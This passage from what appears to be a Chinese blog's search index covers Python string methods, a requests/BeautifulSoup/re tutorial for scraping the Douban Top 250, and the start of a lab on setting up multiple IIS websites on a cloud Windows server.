\"TEST\"\nx = mySeparator.join(myDict)\nprint(x)\n\n'''\n输出：\nnameTESTcountry\n'''\n```\n\n\n注释：在使用字典作为迭代器时，返回的值是键，而不是值。\n\n##### split(separator, max)\n\n> 将字符串拆分为列表，您可以指定分隔符，默认分隔符是任何空白字符。若指定 max，列表将包含指定数量加一的元素。\n\n实例1：\n\n```python\ntxt = \"welcome to China\"\nx = txt.split()\nprint(x)\n\n'''\n输出：\n['welcome', 'to', 'China']\n'''\n```\n\n实例2：\n\n```python\ntxt = \"apple#banana#cherry#orange\"\n# 将 max 参数设置为 1，将返回包含 2 个元素的列表！\nx = txt.split(\"#\", 1)\nprint(x)\n\n'''\n输出：\n['apple', 'banana#cherry#orange']\n'''\n```\n\n#### 内置函数\n\n##### enumerate()\n\n> 用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。\n\n实例1：\n\n```python\n>>>seq = ['one', 'two', 'three']\n>>> for i, element in enumerate(seq):\n...     print i, element\n... \n0 one\n1 two\n2 three\n```\n\n实例2：\n\n```python\n>>>seasons = ['Spring', 'Summer', 'Fall', 'Winter']\n>>> list(enumerate(seasons))\n[(0, 'Spring'), (1, 'Summer'), (2, 'Fall'), (3, 'Winter')]\n>>> list(enumerate(seasons, start=1))       # 下标从 1 开始\n[(1, 'Spring'), (2, 'Summer'), (3, 'Fall'), (4, 'Winter')]\n```\n\n##### exec()\n\n> exec 执行储存在字符串或文件中的 Python 语句，相比于 eval，exec可以执行更复杂的 Python 代码。\n\n```python\n# 单行语句字符串\n>>>exec('print(\"Hello World\")')\nHello World\n\n#  多行语句字符串\n>>> exec (\"\"\"for i in range(5):\n...     print (\"iter time: %d\" % i)\n... \"\"\")\niter time: 0\niter time: 1\niter time: 2\niter time: 3\niter time: 4\n```\n\n## 二、Python爬虫\n\n> 下面的学习方式是以爬取[豆瓣top250](https://movie.douban.com/top250?start=) 网页进行开展的\n>\n> 基本流程:    爬取网页--->解析数据--->保存数据\n\n### 1 requests库\n\n>`Requests`是一个简单方便的`HTTP 库`。比`Python`标准库中的`urllib2`模块功能强大。Requests 使用的是 urllib3，因此继承了它的所有特性。Requests 支持使用`cookie` 保持会话，支持文件上传，支持自动确定响应内容的编码，支持`URL` 和 `POST` 数据自动编码。帮助我们轻松解决关于`HTTP`的大部分问题。\n\n爬取网页首先要学习requests库或者urllib库的使用,不然你无法看懂下面代码\n\n学习requests库,请看我另外一篇文章，里面对requests库进行了详细的讲解[Python模块-Requests学习](https://jwt1399.top/2019/08/08/python-mo-kuai-xue-xi-zhi-requests/)\n\n### 2 爬取网页\n\n#### 2.1 爬取[豆瓣top250](https://movie.douban.com/top250?start=)第一页数据\n\n```python\n#-*- coding =utf-8 -*-\nimport requests\n\ndef askUrl(url):\n    head = { #模拟浏览器头部信息，向豆瓣服务器发送消息\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.69 Safari/537.36 Edg/81.0.416.34\"\n    # 用户代理：告诉豆瓣服务器，我们是什么类型的浏览器（本质上是告诉浏览器我们可以接收什么水平的文件内容）\n    }\n    html=\"\"  #用来接收数据\n    r = requests.get(url, headers = head) #get方式发送请求\n    html = r.text #接收数据\n    print(html)  \n    return html\n\nif __name__ == \"__main__\": # main函数用于测试程序\n    askUrl(\"https://movie.douban.com/top250?start=\") #调用函数\n```\n\n可以看到成功的爬取到豆瓣top250第一页的数据\n\n![image-20200327113957848](https://i.loli.net/2020/03/27/bI84MCajdFuvZJw.png)\n\n#### 2.2 爬取[豆瓣top250](https://movie.douban.com/top250?start=)前10页数据\n\n```python\n#-*- coding =utf-8 -*-\nimport requests\n\n#爬取一个页面\ndef askUrl(url):\n    head = { #模拟浏览器头部信息，向豆瓣服务器发送消息\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.69 Safari/537.36 Edg/81.0.416.34\"\n    # 用户代理：告诉豆瓣服务器，我们是什么类型的浏览器（本质上是告诉浏览器我们可以接收什么水平的文件内容）\n    }\n    #html=\"\"\n    r = requests.get(url, headers = head)\n    html = r.text\n    print(html)\n\n# 爬取所有页面\ndef getData(baseurl):\n    for i in range(0, 10):\n        url = baseurl + str(i * 25)\n        html = askUrl(url)\n\nif __name__ == \"__main__\": # main函数用于测试程序\n    baseurl = \"https://movie.douban.com/top250?start=\"\n    getData(baseurl)\n```\n\n可以看到排名250的梦之安魂曲也被成功爬取到\n\n![image-20200327115150029](https://i.loli.net/2020/03/27/7CDiZOo5jtu2MYw.png)\n\n### 3 BeautifulSoup4库\n\n> BeautifulSoup4和 lxml 一样，Beautiful Soup 也是一个HTML/XML的解析器，主要的功能也是如何解析和提取 HTML/XML 数据。\n\n以下只涉及基础使用，详情请看中文文档：[Beautiful Soup 4.4.0 文档](https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/)\n\n假设有这样一个baidu.html，放在py文件目录下，下面的例子都基于该html,具体内容如下：\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta content=\"text/html;charset=utf-8\" http-equiv=\"content-type\" />\n    <meta content=\"IE=Edge\" http-equiv=\"X-UA-Compatible\" />\n    <meta content=\"always\" name=\"referrer\" />\n    <link href=\"https://ss1.bdstatic.com/5eN1bjq8AAUYm2zgoY3K/r/www/cache/bdorz/baidu.min.css\" rel=\"stylesheet\" type=\"text/css\" />\n    <title>百度一下，你就知道 </title>\n</head>\n<body link=\"#0000cc\">\n  <div id=\"wrapper\">\n    <div id=\"head\">\n        <div class=\"head_wrapper\">\n          <div id=\"u1\">\n            <a class=\"mnav\" href=\"http://news.baidu.com\" name=\"tj_trnews\"><!--新闻--></a>\n            <a class=\"mnav\" href=\"http://news.baidu.com\" name=\"tj_trnews\">新闻</a>\n            <a class=\"mnav\" href=\"https://www.hao123.com\" name=\"tj_trhao123\">hao123</a>\n            <a class=\"mnav\" href=\"http://map.baidu.com\" name=\"tj_trmap\">地图</a>\n            <a class=\"mnav\" href=\"http://v.baidu.com\" name=\"tj_trvideo\">视频</a>\n            <a class=\"mnav\" href=\"http://tieba.baidu.com\" name=\"tj_trtieba\">贴吧</a>\n            <a class=\"bri\" href=\"//www.baidu.com/more/\" name=\"tj_briicon\" style=\"display: block;\">更多产品 </a>\n          </div>\n        </div>\n    </div>\n  </div>\n</body>\n</html>\n```\n\n#### 3.1 快速使用案例\n\n```python\n# 导入模块\nfrom bs4 import BeautifulSoup\n\n# 读取html文件信息（在真实代码中是爬取的网页信息）\nfile = open(\"./baidu.html\",'rb') #解析器\ncontent = f.read()\nf.close()\n\n# 创建解析器\nbs = BeautifulSoup(content,\"html.parser\")\n\n# 输出网页内容：注：此内容已被缩进格式化（自动更正格式），其实这个是在上一步实例化时就已完成\nprint(bs)\n\n#输出网页中title标签中的内容\nprint(bs.title.string)\n```\n#### 3.2 BeautifulSoup4主要解析器\n\n| 解析器           | 使用方法                                                     | 优势                                                      | 劣势                                          |\n| ---------------- | ------------------------------------------------------------ | --------------------------------------------------------- | --------------------------------------------- |\n| Python标准库     | BeautifulSoup(markup, \"html.parser\")                         | Python的内置标准库，执行速度适中，文档容错能力强          | Python 2.7.3 or 3.2.2前的版本中文档容错能力差 |\n| lxml HTML 解析器 | BeautifulSoup(markup, \"lxml\")                                | 速度快 文档容错能力强                                     | 需要安装C语言库                               |\n| lxml XML 解析器  | BeautifulSoup(markup, [\"lxml-xml\"]) BeautifulSoup(markup, \"xml\") | 速度快 唯一支持XML的解析器                                | 需要安装C语言库                               |\n| html5lib         | BeautifulSoup(markup, \"html5lib\")                            | 最好的容错性，以浏览器的方式解析文档，生成HTML5格式的文档 | 速度慢、不依赖外部扩展                        |\n\n#### 3.2  BS4四大对象种类\n\n> BeautifulSoup4将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种\n\n* Tag\n* NavigableString\n* BeautifulSoup \n* Comment\n\n##### 3.2.1 Tag\n\n> Tag通俗点讲就是为了获取HTML中的一个个标签\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\n# 获取title标签的所有内容\nprint(bs.title)  #<title>百度一下，你就知道 </title>\n\n# 获取head标签的所有内容\nprint(bs.head) \n\n# 获取第一个a标签的所有内容\nprint(bs.a) \n\n# 类型\nprint(type(bs.a)) # <class 'bs4.element.Tag'>\n\n\n#bs 对象本身比较特殊，它的 name 即为 [document] \nprint(bs.name) # [document]\n\n# head #对于其他内部标签，输出的值便为标签本身的名称\nprint(bs.head.name)  # head\n\n# 获取a标签里的所有属性，打印输出来，得到的类型是一个字典。 \nprint(bs.a.attrs) \n# {'class': ['mnav'], 'href': 'http://news.baidu.com', 'name': 'tj_trnews'}\n\n#还可以利用get方法，传入属性的名称，二者是等价的\nprint(bs.a['class']) # 等价 bs.a.get('class') \n\n# 可以对这些属性和内容等等进行修改\nbs.a['class'] = \"newClass\"\nprint(bs.a) \n\n# 还可以对这个属性进行删除\ndel bs.a['class'] \nprint(bs.a)\n```\n\n##### 3.2.2 NavigableString\n\n> 既然我们已经得到了标签的内容，那么问题来了，我们要想获取标签内部的文字怎么办呢？很简单，用 .string 即可，例如\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\n#获取title标签中的字符串\nprint(bs.title.string) #百度一下，你就知道 \n\n# 类型\nprint(type(bs.title.string)) \n#<class 'bs4.element.NavigableString'>\n\n```\n\n##### 3.3.3 BeautifulSoup\n\n> BeautifulSoup对象表示的是一个文档的内容。大部分时候，可以把它当作 Tag 对象，是一个特殊的 Tag，我们可以分别获取它的类型，名称，以及属性，例如：\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\n#获取整个文档\nprint(bs)\n\nprint(type(bs)) #<class 'bs4.BeautifulSoup'>\n```\n\n##### 3.3.4 Comment\n\n> Comment 对象是一个特殊类型的 NavigableString 对象，其输出的内容不包括注释符号。\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\nprint(bs.a)\n# a标签如下：\n# <a class=\"mnav\" href=\"http://news.baidu.com\" name=\"tj_trnews\"><!--新闻--></a>\n\nprint(bs.a.string) # 新闻  #不会输出上面a标签中的注释符号\n\nprint(type(bs.a.string)) \n# <class 'bs4.element.Comment'>\n```\n\n#### 3.3 遍历文档数\n\n **.contents：获取Tag的所有子节点，返回一个list**\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\nprint(bs.head.contents)  #获取head下面的所有直接子节点，返回列表 \nprint(bs.head.contents[1 #用列表索引来获取它的某一个元素\n```\n\n **.children：获取Tag的所有子节点，返回一个生成器**\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\nfor child in  bs.body.children:\n\tprint(child)\n```\n\n| .descendants           | 获取Tag的所有子孙节点                                        |\n| ---------------------- | ------------------------------------------------------------ |\n| **.strings**           | **如果Tag包含多个字符串，即在子孙节点中有内容，可以用此获取，而后进行遍历** |\n| **.stripped_strings**  | **与strings用法一致，只不过可以去除掉那些多余的空白内容**    |\n| **.parent**            | **获取Tag的父节点**                                          |\n| **.parents**           | **递归得到父辈元素的所有节点，返回一个生成器**               |\n| **.previous_sibling**  | **获取当前Tag的上一个节点，属性通常是字符串或空白，真实结果是当前标签与上一个标签之间的顿号和换行符** |\n| **.next_sibling**      | **获取当前Tag的下一个节点，属性通常是字符串或空白，真是结果是当前标签与下一个标签之间的顿号与换行符** |\n| **.previous_siblings** | **获取当前Tag的上面所有的兄弟节点，返回一个生成器**          |\n| **.next_siblings**     | **获取当前Tag的下面所有的兄弟节点，返回一个生成器**          |\n| **.previous_element**  | **获取解析过程中上一个被解析的对象(字符串或tag)，可能与previous_sibling相同，但通常是不一样的** |\n| **.next_element**      | **获取解析过程中下一个被解析的对象(字符串或tag)，可能与next_sibling相同，但通常是不一样的** |\n| **.previous_elements** | **返回一个生成器，可以向前访问文档的解析内容**               |\n| **.next_elements**     | **返回一个生成器，可以向后访问文档的解析内容**               |\n| **.has_attr**          | **判断Tag是否包含属性**                                      |\n\n详情请看中文文档：[Beautiful Soup 4.4.0 文档](https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/)\n\n#### 3.4 文档的搜索find_all()\n\n##### name参数\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\n#字符串过滤：会查找与字符串完全匹配的内容\nt_list = bs.find_all(\"a\")\nt_list = bs.find_all(\"title\")\nprint(t_list)\n\n#正则表达式过滤：如果传入的是正则表达式，那么BeautifulSoup4会通过search()来匹配内容\nimport re\nt_list = bs.find_all(re.compile(\"a\"))\nprint(t_list)\n```\n##### 函数参数\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\n#定义函数：传入一个函数，根据函数的要求来搜索\ndef name_is_exists(tag):\n    return tag.has_attr(\"name\")#搜索包含name的标签\n\nt_list = bs.find_all(name_is_exists)\nfor item in t_list: #打印列表内容\n     print(item)\n```\n\n##### keyword参数\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\n#搜索id=head的内容\nt_list = bs.find_all(id=\"head\")\nfor item in t_list:\n    print(item)\n    \n#搜索class=manav的内容    \nt_list = bs.find_all(class_=\"mnav\")\nfor item in t_list: \n     print(item)\n        \n#搜索链接的内容 \nt_list = bs.find_all(href=\"http://news.baidu.com\")\nfor item in t_list: \n     print(item)\n```\n\n##### text参数\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\nimport re\n#t_list = bs.find_all(text=\"hao123\")\n#t_list = bs.find_all(text=[\"hao123\",\"贴吧\",\"地图\"])\nt_list = bs.find_all(text=re.compile(\"\\d\"))#查找包含数字的文本\nfor item in t_list: \n     print(item)\n```\n\n##### limit 参数\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\nt_list = bs.find_all(\"a\",limit=3)\nfor item in t_list: \n     print(item)\n```\n\n#### 3.5 css选择器\n\n```python\nfrom bs4 import BeautifulSoup \nfile = open('./baidu.html', 'rb') \ncontent = file.read() \nbs = BeautifulSoup(content,\"html.parser\") \n\n#通过标签来查找\nt_list = bs.select('title')   \n\n#通过类名（.表示类）来查找\nt_list = bs.select('.mnav')\n\n#通过id（#表示id）来查找\nt_list = bs.select('#u1')\n\n#通过属性来查找 查找a标签中class=bri的内容\nt_list = bs.select(\"a[class='bri']\")   \n\n#通过父子标签来查找\nt_list=bs.select(\"head > title\")   \n\n#通过兄弟标签来查找\nt_list=bs.select(\".mnav ~ .bri\")   \n\nfor item in t_list: #打印列表内容\n       print(item)\nprint(t_list[0].get_text()) #拿到t_list中的文本\n```\n\n### 4 re库\n\n> 正则表达式(Regular Expression)通常被用来`匹配`、`检索`、`替换`和`分割`那些符合某个模式(规则)的文本。\n\n#### 4.1 正则表达式常用操作符\n\n| 操作符 | 说明                              | 实例                                 |\n| ------ | --------------------------------- | ------------------------------------ |\n| .      | 表示除 \"\\n\" 之外的任何单个字符。  |                                      |\n| [ ]    | 宇符集，对单个字符给出取值范围    | [abc]表示a,b,c;[a-z]表示a到z单个字符 |\n| [^ ]   | 非字符集,对单个字符恰给出排除范围 | [^abc]表示非a或非b或c的单个字符      |\n| *      | 前一个字符0次或无限次扩展         | abc* 表示ab、abc、abcc、abcc等       |\n| +      | 前一个字符1次或无限次扩展         | abc+ 表示abc、abcc、abcc等           |\n| ?      | 前一个字符0次或1攻扩展            | abc? 表示ab、abc                     |\n| \\|     | 左右表达式任意一个                | abc\\|def  表示abc、def               |\n| {m}    | 扩展前一个字符m次                 | ab(2}c表示abbc                       |\n| {m,n}  | 扩展前一个字符m至n次(含n)         | ab{1,2}c表示abc、abbc                |\n| ^      | 匹配字符串开头                    | ^abc表示abc且在一个字符串的开头      |\n| $      | 匹配字符串结尾                    | abc$表示abc且在一个字符串的结尾      |\n| ( )    | 分组标记,内部只能使用\\|操作符     | (abc)表示abc ,(abc\\|def)表示abc、def |\n| \\d     | 数字,等价于[0-9]                  |                                      |\n| \\w     | 单词字符,等价于[A-Za-z0-9_ ]      |                                      |\n\n#### 4.2 re库常用函数\n\n| 函数           | 说明                                                         |\n| -------------- | ------------------------------------------------------------ |\n| re.compile()   | 返回一个正则对象的模式。                                     |\n| re. search()   | 在一个字符串中搜素匹配正则表达式的第一个位置 ,返回match对象  |\n| re. match()    | 从一个字符串的开始位置起匹配正则表达式,返回match对象         |\n| re. findall()  | 搜索字符串,以列表类型返回全部能匹配的子串                    |\n| re. split()    | 将一个字符串按照正则表达式匹配结果进行分割,返回列表类型      |\n| re. finditer() | 擅索字符串。返回一个匹配结果的迭代类型，每个选代元素是match对象 |\n| re. sub()      | 在一个字符串中普换所有匹配正则表达式的子串,返回替换后的字符申 |\n\n##### 4.2.1 compile()\n\n格式：`re.compile(pattern[,flags=0])`\n\n- `pattern`: 编译时用的表达式字符串。\n- `flags`: 编译标志位，用于修改正则表达式的匹配方式，如：re.I、re.S等\n\n```python\nimport re\npat=re.compile(\"A\")\nm=pat.search(\"CBA\") #等价于 re.search(A,CBA)\nprint(m)#<re.Match object; span=(2, 3), match='A'>  表示匹配到了\n\nm=pat.search(\"CBD\")\nprint(m)  #None 表示没匹配到\n```\n\n##### 4.2.2 search()\n\n- 在字符串中寻找模式\n\n- 格式：`re.search(pattern, string[, flags=0])`\n\n- re.search函数会在字符串内查找模式匹配,只要找到第一个匹配然后返回，如果字符串没有匹配，则返回None。\n\n```python\n  import re\n  m = re.search(\"asd\" , \"ASDasd\" )\n  print(m)# <_sre.SRE_Match object at 0xb72cd6e8>  #匹配到了，返回MatchObject（True）\n  \n  \n  m = re.search(\"asd\" , \"ASDASD\" )\n  print(m)                                 #没有匹配到，返回None（False）\n```\n##### 4.2.3 match()\n\n- 在字符串开始处匹配模式\n- 格式：`re.match(pattern, string[, flags=0])`\n\n```python\nimport re\npat=re.compile( \"a\" ) \nprint(pat.match( \"Aasd\" )) #输出None\n\npat=re.compile( \"A\" ) \nprint(pat.match( \"Aasd\" )) #输出<_sre.SRE_Match object; span=(0, 1), match='A'>\n```\n\n- 注：match和search一旦匹配成功，就是一个match object对象，而match object对象有以下方法：\n\n  - group() 返回被 RE 匹配的字符串\n  \n  - start() 返回匹配开始的位置\n  \n  - end() 返回匹配结束的位置\n  \n  - span() 返回一个元组包含匹配 (开始,结束) 的位置\n  \n\n##### 4.2.3  findall()\n\n- 列表形式返回匹配项\n\n- 格式：`re.findall(pattern, string[, flags=0])`\n\n```python\n  import re\n  #前面字符串是规则（正则表达式），后面字符串是被校验的字符串\n  print(re.findall(\"a\",\"ASDaDFGAa\"))      \n  #[a,a] \t#列表形式返回匹配到的字符串\n  \n  p = re.compile(r'\\d+')\n  print(p.findall('o1n2m3k4'))\n  #执行结果如下：\n  #['1', '2', '3', '4']\n  \n  print(re.findall(\"[A-Z]\",\"ASDaDFGAa\"))\n  #[ A , S , D , D , F , G , A ] \n  \n  print(re.findall(\"[A-Z]+\",\"ASDaDFGAa\"))\n  #[ ASD , DFGA ]\n  \n  pat = re.compile(\"[A-Za-z]\")\n  print(pat.findall(\"ASDcDFGAa\"))\n  #[ A , S , D , c , D , F , G , A , a ]\n```\n\n##### 4.2.4 re. split()\n\n- 按照能够匹配的子串将string分割后返回列表。\n\n- 可以使用re.split来分割字符串，如：re.split(r'\\s+', text)；将字符串按空格分割成一个单词列表。\n\n- 格式：`re.split(pattern, string[, maxsplit])`\n\n  - `maxsplit`: 用于指定最大分割次数，不指定将全部分割。\n\n```python\nprint(re.split('\\d+','one1two2three3four4five5'))\n\n# 执行结果如下：\n# ['one', 'two', 'three', 'four', 'five', '']\n```\n\n##### 4.2.5 finditer()\n\n- 搜索string，返回一个顺序访问每一个匹配结果（Match对象）的迭代器。\n\n- 找到 RE 匹配的所有子串，并把它们作为一个迭代器返回。\n\n- 格式：`re.finditer(pattern, string[, flags=0])`\n\n  ```python\n  import re\n  iter = re.finditer(r'\\d+','12 drumm44ers drumming, 11 ... 10 ...')\n  for i in iter:\n      print(i)\n      print(i.group())\n      print(i.span())\n  \n  '''\n  # 执行结果如下：\n  <_sre.SRE_Match object; span=(0, 2), match='12'>\n  12\n  (0, 2)\n  <_sre.SRE_Match object; span=(8, 10), match='44'>\n  44\n  (8, 10)\n  <_sre.SRE_Match object; span=(24, 26), match='11'>\n  11\n  (24, 26)\n  <_sre.SRE_Match object; span=(31, 33), match='10'>\n  10\n  (31, 33)\n  '''\n  ```\n\n  \n\n##### 4.2.6 sub()\n\n- 格式：`re.sub(pattern, repl, string, count)`\n\n- 用repl替换 pattern匹配项\n\n  ```python\n  import re\n  print(re.sub(a,A,abcasd)) #找到a用A替换，后面见和group的配合使用\n  #AbcAsd  #第四个参数指替换个数。默认为0，表示每个匹配项都替换。\n  \n  text = \"JGood is a handsome boy, he is cool, clever, and so on...\"\n  print(re.sub(r'\\s+', '-', text)) #\\s:空格\n  #JGood-is-a-handsome-boy,-he-is-cool,-clever,-and-so-on...\n  ```\n\n  \n\n#### 4.3 模式修正符\n\n> 所谓模式修正符，即可以在不改变正则表达式的情况下，通过模式修正符改变正则表达式的含义，从而实现一些匹配结果的调整等功能。\n\n| 修饰符 | 描述                                                         |\n| ------ | ------------------------------------------------------------ |\n| re.I   | 使匹配对大小写不敏感                                         |\n| re.L   | 做本地化识别（locale-aware）匹配                             |\n| re.M   | 多行匹配，影响 ^ 和 $                                        |\n| re.S   | 使 . 匹配包括换行在内的所有字符                              |\n| re.U   | 根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B.      |\n| re.X   | 该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。 |\n\n```python\nimport re\nstring = \"Python\"\npat = \"pyt\"\nrst = re.search(pat,string,re.I) # 第三个参数\nprint(rst)#<_sre.SRE_Match object; span=(0, 3), match='Pyt'>\n```\n\n","tags":["爬虫"],"categories":["Python"]},{"title":"Web服务器配置与管理","url":"/posts/61907.html","content":"\n## 一、实验环境\n\n1.\t操作系统：Windows系统、阿里云Windows Server 2016\n2.\t实验设备：PC机\n\n## 二、 实验内容\n\n任务 1：Web服务器的安装\n任务 2：创建Web站点并实现外网访问\n任务 3：配置客户端访问Web站点\n任务 4：基于IP地址的多个站点的创建\n任务5：基于主机名的多个站点的创建\n任务6：基于端口号的多个站点的创建\n任务7：基于虚拟目录的多个站点的创建\n任务8：通过FTP更新Web站点\n\n## 三、实验步骤与结果\n\n### 1.Web服务器的安装\n\n**i.**\t打开【服务器管理器】，单击【添加角色和功能】选项。\n![](https://i.loli.net/2020/03/21/KC41y3UIPqbJG56.png)\n**ii.**\t在【添加角色和功能向导】中，单击【下一步】按钮。然后，在【安装类型】，选择【基于角色或基于功能的安装】，单击【下一步】按钮。\n![](https://i.loli.net/2020/03/21/h1IVKsPgxafJYbE.png)\n**iii.**\t在【服务器选择】中，选择【从服务器池中选择服务器】，安装程序会自动检测与显示这台计算机采用静态IP地址设置的网络连接，单击【下一步】按钮。\n**iv.**\t在【服务器角色】中，选择【Web服务器（IIS）】,自动弹出【添加Web服务器（IIS）所需的功能】对话框，单击【添加功能】按钮，单击【下一步】按钮。\n**v.**\t在这里选择需要添加的功能，如无特殊需求，一般默认即可，单击【下一步】按钮。\n**vi.**\t在【角色服务】，勾选所需的Web服务器里所需的角色（默认即可，安装完成后可更改），单击【下一步】按钮后继续单击【安装】按钮。\n**vii.**\t单击【关闭】按钮完成安装。\n**viii.**\t回到【服务器管理器】，可以看到左侧多了一项【IIS】，单击【工具】→【Internet信息服务（IIS）管理器】，即可对IIS进行配置、管理。 \n<img src=\"https://i.loli.net/2020/03/21/FwbWQYpiOkvP91d.png\"/>\n\n### 2.创建Web站点并实现外网访问\n\n**i.**\t将网站放置在“C：\\jwt-website”目录中，网站的首页为“homepage.html” 。\n![](https://i.loli.net/2020/03/21/g29w3rZ7oi14WnD.png)\n**ii.**\t打开【服务器管理】，单击【工具】→【Internet信息服务（IIS）管理器】，即可进入【Internet信息服务（IIS）管理器】主窗口。\n\n**iii.**\t展开左侧网站列表，单击【Default Web Site】站点，再右键菜单中选择【管理网站】，单击【停止】按钮。\n<img src=\"https://i.loli.net/2020/03/21/yrehZv8C9QFuwg6.png\"/>\n**iv.**\t在左侧【网站】，单击右键，单击【添加网站】链接来添加网站。\n**v.**\t在【添加网站】对话框中，设置网站名称、物理路径、IP地址，其他默认设置，单击【确定】按钮完成网站创建。<img src=\"https://i.loli.net/2020/03/21/W4SG2RHsrPoAcNa.png\"/>\n\n**vi.**\t在IIS管理器选中【简简网站】，双击【默认文档】。\n**vii.**\t在默认文档中，单击【添加】按钮，在名称中输入存在本地服务器上的网站首页文件（如：homepage.html）。\n![](https://i.loli.net/2020/03/21/f2C4Bk7G8LdSzRH.png)\n\n**viii.**\t在IIS管理器单击右侧【浏览网站】，或者打开浏览器，在地址栏输入【http://172.18.176.138】,即可在本机正常浏览该网站。\n<img src=\"https://i.loli.net/2020/03/21/PC9E5stTDR3z8h1.png\"/>\n\n\n\n### 3.客户端访问Web站点\n\n**现在内网访问网站已经没有问题了，下面进行外网访问的设置**\n\n外网访问需要阿里云打开80端口的访问权限，具体操作`登陆阿里云--实例- -管理--本实例安全组--配置规则`\n\n点击`添加安全组规则`，然后按下图填写规则，然后点击确定\n<img src=\"https://i.loli.net/2020/03/21/8KGTrOkWwxC5b96.png\"/>\n输入阿里云分配的公网IP，我的公网IP为`47.107.236.250`，然后就可以happy的访问我们的网页啦！\n<img src=\"https://i.loli.net/2020/03/21/swA8DcZnielCqrM.png\"/>\n\n参考链接：https://blog.csdn.net/u014453443/article/details/84942670\n\n### 4.基于IP地址的多个站点的创建\n\ni.\t打开【网络共享中心】，单击【以太网卡】，找到【Internet协议版本（TCP/IPv4）】，单击【高级】按钮，单击【添加】按钮，进行IP地添加，添加完成可查看【网络连接详细信息】\n\nii.\t在C盘下创建WGS目录，并在目录下创建三个目录WGS-IP-1、WGS-IP-2、WGS-IP-3，并在每个目录中分别创建first.html、second.html、third.html文件。\n\niii.\t打开【Internet信息服务（IIS）管理器】，在左侧【网站】，单击右键，单击【添加网站】链接来添加网站。\niv.\t在【添加网站】对话框中，在【网站名称】文本框中输入WGS-IP-1，在【物理路径】文本框中输入C:\\WGS\\WGS-IP-1，在【IP地址】文本框中选择10.6.64.8，单击【确定】按钮完成网站创建。\n\nv.\t通过选择不同IP地址，可以创建不同的IP的网站，用同样的方法，配置基于10.6.64.9和10.6.64.10的网站。\n\nvi.\t在客户端浏览器地址栏分别输入 IP地址：10.6.64.8、10.6.64.9、10.6.64.10，都可以正常访问。\n### 5.基于主机名的多个站点的创建\n\ni.\t安装DNS服务器，并在DNS服务器创建不同主机名的域名:www1.wgs.com、www2.wgs.com、www3.wgs.com，并解析到10.6.64.8。\nii.\t在C盘下创建WGS目录，并在目录下创建三个目录WGS-DNS-1、WGS-DNS-2、WGS-DNS-3，并在每个目录中分别创建first.html、second.html、third.html文件。\n\niii.\t打开【Internet信息服务（IIS）管理器】，在左侧【网站】，单击右键，单击【添加网站】链接来添加网站。\niv.\t在【添加网站】对话框中，在【网站名称】文本框中输入WGS-DNS-1，在【物理路径】文本框中输入C:\\WGS\\WGS-DNS-1，在【主机名】文本框中输入www1.wgs.com，单击【确定】按钮完成网站创建。\n\nv.\t通过选择不同的主机名，可以创建不同主机名的网站，用同样的方法，配置基于www2.wgs.com和www3.wgs.com的网站。\n\nvi.\t在客户端浏览器地址栏分别输入不同主机名的域名：www1.wgs.com、www2.wgs.com、www3.wgs.com，都可以正常访问。\n\n### 6.基于端口号的多个站点的创建\n\ni.\t在C盘下创建WGS目录，并在目录下创建三个目录WGS-PORT-1、WGS-PORT-2、WGS-PORT-3，并在每个目录中分别创建first.html、second.html、third.html文件，如图6-45所示。\nii.\t打开【Internet信息服务（IIS）管理器】，在左侧【网站】，单击右键，单击【添加网站】链接来添加网站。\niii.\t在【添加网站】对话框中，在【网站名称】文本框中输入WGS-PORT-1，在【物理路径】文本框中输入C:\\WGS\\WGS- PORT -1，在【端口】文本框中输入8081，单击【确定】按钮完成网站创建。\n\niv.\t通过选择不同端口，可以创建不同端口的网站，用同样的方法，配置基于端口：8082和端口：8083的网站。\n\nv.\t在客户端浏览器地址栏分别输入域名加端口：www.wgs.com:8081、www.wgs.com:8082、www.wgs.com:8083，都可以正常访问。\n\n### 